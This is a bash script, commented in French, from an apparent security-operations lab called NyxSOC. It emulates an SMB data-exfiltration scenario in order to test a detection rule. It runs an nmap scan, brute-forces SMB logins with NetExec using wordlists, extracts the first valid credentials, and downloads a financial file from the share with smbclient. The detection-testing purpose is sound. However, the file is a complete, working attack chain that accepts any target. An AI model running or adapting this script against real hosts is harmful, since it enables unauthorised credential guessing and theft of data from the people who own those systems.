#!/usr/bin/env bash
#
# smb_exfil.sh - Scénario S2 : Exfiltration de données financières via SMB
# (NyxSOC)
#
# Chaîne d'attaque en 3 étapes, conforme à Topologie.pdf §6.2 :
#   1. Reconnaissance réseau (nmap)       -> filterlog (OPNsense) : net_scan
#   2. Brute-force SMB (NetExec / nxc)    -> daemon/Samba : smb_failure
#   3. Exfiltration (smbclient)           -> daemon/Samba : samba_read
#
# Règle attendue : SMB_EXFIL_001 (Type 3, cooccurrence net_scan + samba_read
# en 300 secondes).
#
# Prérequis :
#   - users.txt / passwords.txt générés via gen_smb_wordlists.py
#   - releves_mm.csv déjà déposé dans //target/direction (deploy_bait_file.sh)
#   - nmap, netexec (nxc), smbclient installés (par défaut sur Kali récent)
#
# Usage :
#   ./smb_exfil.sh <target_ip> <target_share> <remote_file>
#
# Exemple :
#   ./smb_exfil.sh 10.0.1.20 direction releves_mm.csv

set -euo pipefail

TARGET="${1:-10.0.1.20}"
SHARE="${2:-direction}"
REMOTE_FILE="${3:-releves_mm.csv}"

USERS_FILE="users.txt"
PASSWORDS_FILE="passwords.txt"

LOGDIR="./logs"
mkdir -p "$LOGDIR"

RUN_ID="s2_$(date +%Y%m%d_%H%M%S)"
TS_START=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
TS_START_EPOCH=$(date +%s.%N)

NMAP_LOG="${LOGDIR}/${RUN_ID}_1_nmap.log"
CME_LOG="${LOGDIR}/${RUN_ID}_2_cme.log"
SMBCLIENT_LOG="${LOGDIR}/${RUN_ID}_3_smbclient.log"
METAFILE="${LOGDIR}/${RUN_ID}.meta.json"

for f in "$USERS_FILE" "$PASSWORDS_FILE"; do
    if [ ! -f "$f" ]; then
        echo "[!] Fichier introuvable : $f"
        echo "    Génère-le d'abord avec gen_smb_wordlists.py"
        exit 1
    fi
done

echo "=================================================="
echo " NyxSOC — Scénario S2 : Exfiltration SMB"
echo "=================================================="
echo " Cible       : ${TARGET}"
echo " Partage     : ${SHARE}"
echo " Fichier     : ${REMOTE_FILE}"
echo " Run ID      : ${RUN_ID}"
echo " Début (UTC) : ${TS_START}"
echo "=================================================="

if ! ping -c 1 -W 2 "$TARGET" > /dev/null 2>&1; then
    echo "[!] Cible ${TARGET} injoignable. Vérifier le réseau nyx."
    exit 1
fi

# Étape 1 : reconnaissance réseau
echo ""
echo "[1/3] Scan nmap (reconnaissance réseau)..."
TS_STEP1_START=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
nmap -sV "${TARGET}/32" -oN "$NMAP_LOG" || true
TS_STEP1_END=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
echo "[+] Scan terminé. Résultat : ${NMAP_LOG}"

# Étape 2 : brute-force SMB 
echo ""
echo "[2/3] Brute-force SMB (NetExec)..."
TS_STEP2_START=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
nxc smb "$TARGET" -u "$USERS_FILE" -p "$PASSWORDS_FILE" 2>&1 | tee "$CME_LOG" || true
TS_STEP2_END=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")

# Extraction du premier compte/mot de passe valide trouvé (marqué [+] par nxc)
VALID_LINE=$(grep -m1 '\[+\]' "$CME_LOG" || true)
if [ -z "$VALID_LINE" ]; then
    echo "[!] Aucune paire valide trouvée par NetExec. Arrêt avant exfiltration."
    echo "    Vérifie users.txt / passwords.txt et le mot de passe réel injecté."
    exit 1
fi
echo "[+] Paire valide trouvée : ${VALID_LINE}"

# Format typique nxc : "SMB  10.0.1.20  445  SRV-PME  [+] NYX\dir1:MotDePasse"
VALID_USER=$(echo "$VALID_LINE" | grep -oP '(?<=\\\\)[^:]+(?=:)' || echo "unknown")
VALID_PASS=$(echo "$VALID_LINE" | grep -oP '(?<=:)[^\s]+$' || echo "unknown")

echo "    Compte compromis : ${VALID_USER}"

# Étape 3 : exfiltration
echo ""
echo "[3/3] Exfiltration via smbclient..."
TS_STEP3_START=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
smbclient "//${TARGET}/${SHARE}" -U "${VALID_USER}%${VALID_PASS}" \
    -c "get ${REMOTE_FILE}" 2>&1 | tee "$SMBCLIENT_LOG" || true
TS_STEP3_END=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")

if [ -f "$REMOTE_FILE" ]; then
    echo "[+] Fichier exfiltré avec succès : ./${REMOTE_FILE}"
else
    echo "[!] Le fichier n'a pas été récupéré localement — vérifier ${SMBCLIENT_LOG}"
fi

TS_END=$(date -u +"%Y-%m-%dT%H:%M:%S.%3NZ")
TS_END_EPOCH=$(date +%s.%N)
DURATION=$(awk -v a="$TS_START_EPOCH" -v b="$TS_END_EPOCH" 'BEGIN{printf "%.3f", b-a}')

cat > "$METAFILE" <<EOF
{
  "scenario": "S2_SMB_EXFIL",
  "run_id": "${RUN_ID}",
  "target_ip": "${TARGET}",
  "actor_ip": "10.0.1.50",
  "share": "${SHARE}",
  "remote_file": "${REMOTE_FILE}",
  "compromised_user": "${VALID_USER}",
  "ts_start_utc": "${TS_START}",
  "ts_end_utc": "${TS_END}",
  "duration_seconds": ${DURATION},
  "steps": {
    "1_nmap_scan": { "start": "${TS_STEP1_START}", "end": "${TS_STEP1_END}", "log": "${NMAP_LOG}" },
    "2_smb_bruteforce": { "start": "${TS_STEP2_START}", "end": "${TS_STEP2_END}", "log": "${CME_LOG}" },
    "3_smb_exfiltration": { "start": "${TS_STEP3_START}", "end": "${TS_STEP3_END}", "log": "${SMBCLIENT_LOG}" }
  },
  "expected_rule": "SMB_EXFIL_001",
  "mitre": ["T1041", "T1048", "T1021.002"]
}
EOF

echo "=================================================="
echo " Fin (UTC)  : ${TS_END}"
echo " Durée      : ${DURATION}s"
echo " Métadonnées: ${METAFILE}"
echo "=================================================="
echo "[+] Terminé. Vérifie filterlog (OPNsense) + daemon/Samba (Debian Server) côté SOC."